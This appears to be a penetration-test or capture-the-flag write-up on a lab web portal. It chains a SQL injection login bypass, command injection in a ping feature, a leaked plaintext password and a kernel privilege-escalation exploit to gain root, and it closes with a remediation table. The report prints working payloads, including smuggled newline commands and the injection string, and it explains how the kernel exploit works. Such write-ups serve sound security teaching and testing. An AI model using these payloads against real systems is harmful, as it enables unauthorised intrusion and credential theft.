# Silent Monitor — Proof of Concept Report

Oct 15, 2026 · Prepared by @Kali

## Executive Summary

An unauthenticated attacker can fully compromise the target host by chaining four separate weaknesses in the "CorpNet NOC Portal" web application (port 5050) and the underlying OS.

1. **SQL Injection** in the login form bypasses authentication entirely.
2. **OS Command Injection** in the "Host Health Check" feature executes arbitrary shell commands as `www-data`.
3. A world-readable **configuration file** (`secret.config`), reached through the command injection, leaks a plaintext `sysadmin` password.
4. A **Linux kernel privilege escalation** (CVE-2026-31431, functionally equivalent to Dirty Pipe / CVE-2022-0847) elevates the `sysadmin` SSH session to `root`.

Each step on its own is serious; chained together they give a remote, unauthenticated attacker a path from zero access to full root on the host in minutes. Severity is rated **Critical**.

## Scope & Target Information

| Field | Detail |
| --- | --- |
| Target IP | 10.48.158.235 |
| Attack box IP | 10.48.110.251 |
| Access method | OpenVPN, SSH to attack box |
| Testing date | 04 Oct 2026 |
| Tester | shoaib-khan |
| Severity | Critical (unauthenticated RCE to root) |

**Open ports** (`nmap -sT -sV -p- 10.48.158.235`):

| Port | State | Service | Version |
| --- | --- | --- | --- |
| 22/tcp | open | ssh | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 |
| 5050/tcp | open | http | Werkzeug httpd 2.0.2 (Python 3.10.12) |



## Steps to Reproduce

### 4.1 Reconnaissance

```
nmap -sT -sV -p- 10.48.158.235
```

Result: 2 open ports — 22 (SSH) and 5050 (HTTP/Werkzeug).

<img width="976" height="297" alt="2026-10-04_20-16" src="https://github.com/user-attachments/assets/825cb064-806f-4b1a-afe2-b83cfc1b1bd2" />


### 4.2 Web Enumeration

`http://10.48.158.235:5050` shows a static landing page with no visible functionality. Directory brute-force uncovers a hidden path:

<img width="1847" height="1127" alt="Silent Monitor 1st photo of web" src="https://github.com/user-attachments/assets/cdb4d5eb-d051-4148-a8f3-956c2fca765c" />


```
dirb http://10.48.158.235:5050
```

Result: `http://10.48.158.235:5050/internal` (CODE:200 | SIZE:8770).

<img width="783" height="508" alt="2026-10-04_20-24" src="https://github.com/user-attachments/assets/165ee7a4-8dac-44eb-b9e9-2c22321a8267" />



### 4.3 Vulnerability #1 — SQL Injection (Authentication Bypass)

`/internal` is a "Sign In to NOC Portal" login form. Payload used in the username field:

<img width="1849" height="1122" alt="Silent Monitor 2nd photo" src="https://github.com/user-attachments/assets/55531c58-7881-459e-80cd-0f526c4039a6" />


```sql
' OR 1==1--
```

<img width="1849" height="1127" alt="Silent Monitor 3" src="https://github.com/user-attachments/assets/ff83e9a9-61f2-4bca-82a7-2a59160c422f" />


Reconstructed backend query being manipulated:

```sql
SELECT * FROM user WHERE username = 'users' AND password = '[redacted]'
```

| Payload part | Purpose |
| --- | --- |
| `'` | Closes the original string literal in the SQL query |
| `OR 1==1` | Always-true condition, bypasses the password check |
| `--` | Comments out the rest of the original query |

Result: login succeeds with no valid password, redirecting to `/internal/dashboard` — an internal NOC admin dashboard (System Overview, Audit Log, Host Health, Services).

<img width="1856" height="1131" alt="Silent Monitor 4th photo" src="https://github.com/user-attachments/assets/9d25c4e1-b3dc-4f94-9814-6eaff4000a1b" />


### 4.4 Vulnerability #2 — OS Command Injection (Host Health Check)

The dashboard's "Host Health Check" pings an attacker-supplied IP. Request captured in Burp Suite → Repeater:

<img width="1852" height="1125" alt="Silent monitor 5th" src="https://github.com/user-attachments/assets/fb8e5142-16a4-4314-b60c-fe2559184fe4" />


<img width="1852" height="1122" alt="Silent Monitor 6th" src="https://github.com/user-attachments/assets/8dd8760d-8252-4837-83cf-4756eaf5b4f4" />


```
POST /internal/health HTTP/1.1
Host: 10.48.158.235:5050
Content-Type: application/x-www-form-urlencoded
```

Payload #1 — confirm injection (`%0a` = newline, chains a second shell command after `ping`):

```
target=127.0.0.1%0aid
```

<img width="1854" height="1170" alt="Silent Monitor 7th" src="https://github.com/user-attachments/assets/c24cd9b5-4f79-47fd-86ce-26600d3b738c" />


Result: response includes ping output plus `uid=33(www-data) gid=33(www-data) groups=33(www-data)` — confirms unauthenticated command injection as `www-data`.

<img width="1462" height="901" alt="2026-10-04_21-34" src="https://github.com/user-attachments/assets/fca84a0c-32b8-4c14-b1a9-b29b74a4582a" />


Payload #2 — read sensitive config file:

```
target=127.0.0.1%0acat secret.config
```

Result — leaked credentials:

```ini
[backup_agent]
run_as = sysadmin
password = S3cur3Backup$Acc3ss!

[smtp]
host = 127.0.0.1
port = 25
```

<img width="1424" height="860" alt="2026-10-04_21-38" src="https://github.com/user-attachments/assets/799041f3-8323-4126-b7b5-ed7d6b667ea6" />


### 4.5 Credential Use — SSH Access

```
ssh sysadmin@10.48.158.235
# password: S3cur3Backup$Acc3ss!
```

Result: successful login as `sysadmin`; `user.txt` captured (redacted).

<img width="1859" height="925" alt="2026-10-04_22-11" src="https://github.com/user-attachments/assets/bad2c6e7-4071-44d3-a91f-756c7213ea38" />

### 4.6 Vulnerability #3 — Kernel Local Privilege Escalation (CVE-2026-31431)

Kernel version on the host is vulnerable to CVE-2026-31431 ("Copy Fail"), functionally similar to Dirty Pipe (CVE-2022-0847).

<img width="1834" height="1043" alt="Silent Monitor 8th" src="https://github.com/user-attachments/assets/8ec99695-ed1c-4277-8939-0b278718b8c8" />


```
nano -w cp.py
# paste exploit code (theori-io/copy-fail-CVE-2026-31431)
python3 cp.py
```
Result:

```
whoami
root
```

`root.txt` captured (redacted).

<img width="485" height="319" alt="2026-10-04_22-18" src="https://github.com/user-attachments/assets/21407c89-a0ec-4091-aa66-0fa3887bafb2" />



## Technical Analysis — Kernel Exploit Breakdown

The exploit (`cp.py`) escalates privileges by abusing a kernel memory-overwrite bug to patch a SUID-root binary (`/usr/bin/su`) in memory.

| Stage | What it does |
| --- | --- |
| Imports | Loads `os`, `zlib`, `socket` |
| `d(x)` helper | Converts a hex string into raw bytes |
| AF\_ALG socket | Opens a kernel crypto-API socket (AEAD, HMAC-SHA256 + AES-CBC) with crafted parameters |
| `os.open("/usr/bin/su", 0)` | Opens the SUID-root `su` binary read-only — the overwrite target |
| `zlib.decompress(...)` | Decompresses an embedded hex-encoded payload — the malicious patch |
| `os.splice()` + pipe | Uses the zero-copy `splice()` syscall to push attacker data into the kernel's page cache for the target file; a race/validation flaw lets the read-only page get overwritten anyway |
| Patch loop | Writes the decompressed payload into the cached file memory in 4-byte chunks |
| `os.system("su")` | Executes the patched, SUID-root `su` binary — its overwritten in-memory code hands back a root shell, bypassing any password prompt |

This mirrors Dirty Pipe: a kernel bug lets an unprivileged process write to a file opened read-only, and that write lands in a privileged SUID binary, yielding privilege escalation without a valid password or disk write permission.

## Impact

- An unauthenticated attacker bypasses login via SQL injection.
- From the dashboard, the attacker gains arbitrary command execution as `www-data`.
- Command execution leaks plaintext credentials for a privileged service account.
- Those credentials grant interactive SSH access.
- A local kernel bug then grants full root on the host.

End result: complete compromise of the host — read/write access to all local files and services, plus potential lateral movement into connected network segments (Management, Server, DMZ, and User VLANs visible on the dashboard).

## Remediation

| Issue | Fix |
| --- | --- |
| SQL injection | Use parameterized queries / prepared statements; never concatenate user input into SQL; apply least-privilege DB accounts |
| OS command injection | Never pass user input to a shell command; use safe APIs (e.g. `subprocess` with `shell=False` and an argument list); validate input with a strict IP/hostname pattern |
| Secrets in a plaintext config file | Store credentials in a secrets manager or vault, not a world-readable config file; encrypt at rest |
| Over-privileged service account | Apply least privilege: a web-facing process should never be able to reach credentials for a higher-privileged account |
| Kernel LPE (CVE-2026-31431) | Patch the kernel to a fixed version immediately; track CVE advisories; restrict SUID binaries where possible |

## Evidence & References

**Flags** (redacted in this report, held separately by the tester):

- `user.txt` — redacted
- `root.txt` — redacted

**References**

- CVE-2026-31431 — "Copy Fail" (exploit: `theori-io/copy-fail-CVE-2026-31431`)
- CVE-2022-0847 — "Dirty Pipe" (comparison reference)
- OWASP: SQL Injection
- OWASP: OS Command Injection
